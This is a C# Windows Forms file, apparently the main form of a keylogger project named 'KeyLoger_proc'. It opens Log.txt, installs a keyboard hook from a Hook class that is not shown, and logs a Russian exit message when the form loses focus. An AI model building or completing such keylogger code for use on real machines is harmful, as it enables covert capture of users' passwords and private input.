using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
namespace KeyLoger_proc
{
   
    public partial class Form1 : Form
    {
        public static StreamWriter write;
        public Form1()
        {
            InitializeComponent();
        }
     
        private void Form1_Load(object sender, EventArgs e)
        {
            FileStream fs;
            fs = new FileStream("Log.txt", FileMode.Append, FileAccess.Write);
            write = new StreamWriter(fs);
          Hook h = new Hook();
            h.SetHook();
            
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {

            
            write.WriteLine("Выполнен выход  " + DateTime.Now.ToString());
            write.Close();
        }
    }
}
